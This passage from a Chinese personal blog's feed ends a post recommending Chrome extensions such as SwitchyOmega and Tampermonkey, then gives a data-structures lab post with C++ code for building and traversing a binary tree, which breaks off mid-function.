data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200423190319724.png"  alt="image-20200423190319724"></p><h2 id="下载链接-7"><a href="#下载链接-7" class="headerlink" title="下载链接"></a>下载链接</h2><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200423190436492.png"  alt="image-20200423190436492"></p><p><a href="[https://chrome.google.com/webstore/detail/%E6%B2%99%E6%8B%89%E6%9F%A5%E8%AF%8D-%E8%81%9A%E5%90%88%E8%AF%8D%E5%85%B8%E5%88%92%E8%AF%8D%E7%BF%BB%E8%AF%91/cdonnmffkdaoajfknoeeecmchibpmkmg?utm_source=chrome-ntp-icon](https://chrome.google.com/webstore/detail/沙拉查词-聚合词典划词翻译/cdonnmffkdaoajfknoeeecmchibpmkmg?utm_source=chrome-ntp-icon)">点我下载</a></p><h1 id="crxMouse-Chrome™-手势"><a href="#crxMouse-Chrome™-手势" class="headerlink" title="crxMouse Chrome™ 手势"></a>crxMouse Chrome™ 手势</h1><h2 id="功能-8"><a href="#功能-8" class="headerlink" title="功能"></a>功能</h2><p>鼠标手势实现后退前进刷新等操作</p><h2 id="说明-8"><a href="#说明-8" class="headerlink" title="说明"></a>说明</h2><p>关闭标签页刷新等操作不用去点击上面的按钮了。</p><p>支持浏览器内更换鼠标样式</p><p>我算看透了，这些插件就是咋懒咋弄咋省事咋弄</p><h2 id="下载链接-8"><a href="#下载链接-8" class="headerlink" title="下载链接"></a>下载链接</h2><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200423192630117.png"  alt="image-20200423192336453"></p><p><a href="https://chrome.google.com/webstore/detail/crxmouse-chrome-gestures/jlgkpaicikihijadgifklkbpdajbkhjo" target="_blank" rel="noopener">点我下载</a></p><h1 id="Proxy-SwitchyOmega"><a href="#Proxy-SwitchyOmega" class="headerlink" title="Proxy SwitchyOmega"></a>Proxy SwitchyOmega</h1><h2 id="功能-9"><a href="#功能-9" class="headerlink" title="功能"></a>功能</h2><p>快速切换代理</p><h2 id="说明-9"><a href="#说明-9" class="headerlink" title="说明"></a>说明</h2><p>比如你开的是PAC模式想全局模式打开某网站，点击插件选择我们配置好的代理即可快速切换全局模式，用完选回原来的模式即可</p><p>配置比如下面这样</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200423192336453.png"  alt="image-20200423192556929"></p><p>它长这个样</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200423192556929.png"  alt="image-20200423192630117"></p><h2 id="下载链接-9"><a href="#下载链接-9" class="headerlink" title="下载链接"></a>下载链接</h2><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200423192648948.png"  alt="image-20200423192648948"></p><p><a href="https://chrome.google.com/webstore/detail/proxy-switchyomega/padekgcemlokbadohgkifijomclgjgif" target="_blank" rel="noopener">点我下载</a></p><h1 id="SmoothScroll"><a href="#SmoothScroll" class="headerlink" title="SmoothScroll"></a>SmoothScroll</h1><h2 id="功能-10"><a href="#功能-10" class="headerlink" title="功能"></a>功能</h2><p>让你的浏览器滑动如飘柔般丝滑</p><h2 id="说明-10"><a href="#说明-10" class="headerlink" title="说明"></a>说明</h2><p>下载好不用配置即可使用，确实有点作用，现在一直在用</p><h2 id="下载链接-10"><a href="#下载链接-10" class="headerlink" title="下载链接"></a>下载链接</h2><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200423192840387.png"  alt="image-20200423192840387"></p><p><a href="https://chrome.google.com/webstore/detail/smoothscroll/nbokbjkabcmbfdlbddjidfmibcpneigj" target="_blank" rel="noopener">点我下载</a></p><h1 id="扩展管理器"><a href="#扩展管理器" class="headerlink" title="扩展管理器"></a>扩展管理器</h1><h2 id="功能-11"><a href="#功能-11" class="headerlink" title="功能"></a>功能</h2><p>快速开启关闭插件</p><h2 id="说明-11"><a href="#说明-11" class="headerlink" title="说明"></a>说明</h2><p>如果我们有太多的插件一直开着势必会浪费资源。对于某些偶尔用到的插件，我们没必要一直开着，比如我现在这样关闭一部分</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200423193216700.png"  alt="image-20200423193154208"></p><h2 id="下载链接-11"><a href="#下载链接-11" class="headerlink" title="下载链接"></a>下载链接</h2><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200423193154208.png"  alt="image-20200423193216700"></p><p><a href="https://chrome.google.com/webstore/detail/extension-manager/gjldcdngmdknpinoemndlidpcabkggco" target="_blank" rel="noopener">点我下载</a></p><h1 id="Tampermonkey-油猴"><a href="#Tampermonkey-油猴" class="headerlink" title="Tampermonkey(油猴)"></a>Tampermonkey(油猴)</h1><h2 id="功能-12"><a href="#功能-12" class="headerlink" title="功能"></a>功能</h2><p>丰富的脚本实现类似插件的功能</p><h2 id="说明-12"><a href="#说明-12" class="headerlink" title="说明"></a>说明</h2><p>把它放在了最后不是因为它不好用，而是它太强大了。上面所说的查词就是用这其中的一个js脚本代替的。</p><p>它能干的事可太多了，比如下面这些</p><ul><li>查词(类似沙拉查词)</li><li>智慧树、超星等自动刷课、搜练习答案(脚本虽好还是要好好学习的)</li><li>破解影视vip(其实就是比如爱奇艺那个页面有个按钮可快速跳转到某些不要钱看视频的网站)</li><li>百度网盘自动填写密码</li><li>方便各个浏览器跳转</li></ul><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200423193654058.png"  alt="image-20200423193654058"></p><ul><li>还有很多不一一列举</li></ul><h2 id="问卷"><a href="#问卷" class="headerlink" title="问卷"></a>问卷</h2><p>如果你对上面的油猴插件感兴趣，下方留言，我视情况选择是否出篇文章分享。</p><h1 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h1><p>分享不易，如果对你有帮助，可下方留言博客点个关注互动下。</p><p>还望支持下我的CSDN :<a href="https://blog.csdn.net/zss192" target="_blank" rel="noopener">点我查看</a></p><p>不然我也不知道对你们有没有帮助，真的没动力继续分享下去了。</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/743d495a90ad5ee0bda0392bbe883ce6064056dc311b34aae.jpg"  alt="743d495a90ad5ee0bda0392bbe883ce6064056dc311b34aae"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;写在前面&quot;&gt;&lt;a href=&quot;#写在前面&quot; class=&quot;headerlink&quot; title=&quot;写在前面&quot;&gt;&lt;/a&gt;写在前面&lt;/h1&gt;&lt;p&gt;谷歌浏览器算是我日常用的最多的软件了，之所以谷歌会那么强，很大一部分原因就是其丰富的插件便利了日常操作。&lt;/p&gt;
&lt;p&gt;先放
      
    
    </summary>
    
    
      <category term="日常办公" scheme="http://zssblog.top/categories/%E6%97%A5%E5%B8%B8%E5%8A%9E%E5%85%AC/"/>
    
    
      <category term="日常办公" scheme="http://zssblog.top/tags/%E6%97%A5%E5%B8%B8%E5%8A%9E%E5%85%AC/"/>
    
  </entry>
  
  <entry>
    <title>实验四 二叉树的操作</title>
    <link href="http://zssblog.top/2020/04/23/%E5%AE%9E%E9%AA%8C%E5%9B%9B-%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%93%8D%E4%BD%9C/"/>
    <id>http://zssblog.top/2020/04/23/%E5%AE%9E%E9%AA%8C%E5%9B%9B-%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%93%8D%E4%BD%9C/</id>
    <published>2020-04-23T09:07:00.000Z</published>
    <updated>2020-04-23T09:08:15.665Z</updated>
    
    <content type="html"><![CDATA[<h1 id="实验性质：综合性实验"><a href="#实验性质：综合性实验" class="headerlink" title="实验性质：综合性实验"></a>实验性质：综合性实验</h1><h1 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h1><p>  (1) 采用二叉链表结构建立二叉树；<br>  (2) 编程实现二叉树的先序、中序、后序和层序遍历；<br>  (3) 编程实现非递归中序遍历<br>  (3) 编程实现：求二叉树的高度和叶子结点个数；</p><h1 id="目的："><a href="#目的：" class="headerlink" title="目的："></a>目的：</h1><p>（1）掌握二叉树的二叉链表存储方式及二叉树的特征；<br>（2）验证二叉树在二叉链表存储结构下遍历操作的实现；</p><h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><ul><li><p>创建<br>输入 ：ABC##DE#G##F###<br>该输入对应的树如图所示<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200423170621698.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p></li><li><p>先序   屏幕输出  A B C D E G F</p></li><li><p>后序   屏幕输出  C G E F D B A</p></li><li><p>中序   屏幕输出  C B E G D F A     </p></li><li><p>(中序非递归还需看源代码)</p></li><li><p>层序   屏幕输出  A B C D E F G</p></li><li><p>深度   屏幕显示 深度为5</p><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QElemType BiTree</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SElemType BiTree</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 30</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> TElemType;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义二叉链表存储结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    TElemType data;  <span class="comment">//数据域</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span> *<span class="title">lchild</span>,*<span class="title">rchild</span>;</span>  <span class="comment">//指针域</span></span><br><span class="line">&#125;BiTNode,*BiTree;</span><br><span class="line"><span class="comment">//循环队列类型定义</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    QElemType *base;</span><br><span class="line">    <span class="keyword">int</span> front;</span><br><span class="line">    <span class="keyword">int</span> rear;</span><br><span class="line">&#125;SqQueue;</span><br><span class="line"><span class="comment">//顺序栈定义</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    SElemType *base;</span><br><span class="line">    SElemType *top;</span><br><span class="line">    <span class="keyword">int</span> stacksize;</span><br><span class="line">&#125;SqStack;</span><br><span class="line"><span class="comment">//二叉树</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitBiTree</span><span class="params">(BiTree &amp;T)</span></span>;    <span class="comment">//构造空二叉树</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateBiTree</span><span class="params">(BiTree &amp;T)</span></span>;<span class="comment">//先序遍历建立二叉链表</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PreOrderTraverse</span><span class="params">(BiTree T)</span></span>; <span class="comment">//先序遍历</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InOrderTraverse</span><span class="params">(BiTree T)</span></span>; <span class="comment">//中序遍历</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PostOrderTraverse</span><span class="params">(BiTree T)</span></span>;   <span class="comment">//后序遍历</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LevelOrderTraverse</span><span class="params">(BiTree T)</span></span>;  <span class="comment">//层序遍历</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InOrderTraverse2</span><span class="params">(BiTree T)</span></span>;    <span class="comment">//非递归中序遍历</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Depth</span><span class="params">(BiTree T)</span></span>; <span class="comment">//计算二叉树深度</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LeafCount</span><span class="params">(BiTree bt)</span></span>;  <span class="comment">//计算叶子节点个数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//顺序栈</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">InitStack</span><span class="params">(SqStack &amp;S)</span></span>; <span class="comment">//顺序栈的初始化</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Push</span><span class="params">(SqStack &amp;S,SElemType e)</span></span>;<span class="comment">//顺序栈的入栈</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Pop</span><span class="params">(SqStack &amp;S,SElemType e)</span></span>; <span class="comment">//删除栈顶元素</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">StackEmpty</span><span class="params">(SqStack S)</span></span>;</span><br><span class="line"><span class="function">SElemType <span class="title">GetTop</span><span class="params">(SqStack S)</span></span>; <span class="comment">//取栈顶元素</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//队列</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">InitQueue</span><span class="params">(SqQueue &amp;Q)</span></span>;<span class="comment">//初始化队列</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">EnQueue</span><span class="params">(SqQueue &amp;Q,QElemType e)</span></span>;<span class="comment">//元素入队</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">DeQueue</span><span class="params">(SqQueue &amp;Q,QElemType &amp;e)</span></span>;<span class="comment">//元素出队</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">DestroyQueue</span><span class="params">(SqQueue &amp;Q)</span></span>;<span class="comment">//销毁队列</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">QueueEmpty</span><span class="params">(SqQueue Q)</span></span>;<span class="comment">//队列判空</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Menu</span><span class="params">()</span></span>;  <span class="comment">//文字菜单提示信息</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BiTree T;</span><br><span class="line">    InitBiTree(T);</span><br><span class="line">    Menu();</span><br><span class="line">    <span class="keyword">int</span> i;  <span class="comment">//输入的数字</span></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"请输入操作代码："</span>;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;i;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">switch</span>(i)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入字符序列,#代表空："</span>;</span><br><span class="line">            CreateBiTree(T);</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"创建成功"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"先序遍历结果为："</span>;</span><br><span class="line">            PreOrderTraverse(T);</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"中序遍历结果为："</span>;</span><br><span class="line">            InOrderTraverse(T);</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"后序遍历结果为："</span>;</span><br><span class="line">            PostOrderTraverse(T);</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"层序遍历结果为："</span>;</span><br><span class="line">            LevelOrderTraverse(T);</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"非递归中序遍历结果为："</span>;</span><br><span class="line">            InOrderTraverse2(T);</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"二叉树深度为："</span>&lt;&lt;Depth(T)&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"二叉树叶子结点个数为："</span>&lt;&lt;LeafCount(T)&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">if</span>(i&lt;<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入的位置非法，请重新输入"</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"请输入操作代码："</span>;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//二叉树</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitBiTree</span><span class="params">(BiTree &amp;T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    T = <span class="keyword">new</span> BiTNode;</span><br><span class="line">    T-&gt;lchild = T-&gt;rchild = <span class="literal">NULL</span>;</span><br><span class="line">    T-&gt;data = <span class="string">'#'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateBiTree</span><span class="params">(BiTree &amp;T)</span> <span class="comment">//先序遍历建立二叉链表</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;ch;</span><br><span class="line">    <span class="keyword">if</span>(ch==<span class="string">'#'</span>)</span><br><span class="line">        T=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        T=<span class="keyword">new</span> BiTNode;</span><br><span class="line">        T-&gt;data=ch;</span><br><span class="line">        CreateBiTree(T-&gt;lchild);    <span class="comment">//递归创建左子树</span></span><br><span class="line">        CreateBiTree(T-&gt;rchild);    <span class="comment">//递归创建右子树</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PreOrderTraverse</span><span class="params">(BiTree T)</span> <span class="comment">//先序遍历</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;T-&gt;data;  <span class="comment">//访问根节点</span></span><br><span class="line">        PreOrderTraverse(T-&gt;lchild); <span class="comment">//先序遍历左子树</span></span><br><span class="line">        PreOrderTraverse(T-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InOrderTraverse</span><span class="params">(BiTree T)</span> <span class="comment">//中序遍历</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T)</span><br><span class="line">    &#123;</span><br><span class="line">        InOrderTraverse(T-&gt;lchild); <span class="comment">//中序遍历左子树</span></span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;T-&gt;data;  <span class="comment">//访问根节点</span></span><br><span class="line">        InOrderTraverse(T-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PostOrderTraverse</span><span class="params">(BiTree T)</span>   <span class="comment">//后序遍历</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T)</span><br><span class="line">    &#123;</span><br><span class="line">        PostOrderTraverse(T-&gt;lchild); <span class="comment">//后序遍历左子树</span></span><br><span class="line">        PostOrderTraverse(T-&gt;rchild);</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;T-&gt;data;  <span class="comment">//访问根节点</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LevelOrderTraverse</span><span class="params">(BiTree T)</span>  <span class="comment">//层序遍历</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="comment">//将每一层的节点分别入队列，然后分别读取，读取后继续将它们的子节点入队，所以保证是按照一层一层来遍历的</span></span><br><span class="line">    BiTree P=T;</span><br><span class="line">    SqQueue Q;</span><br><span class="line">    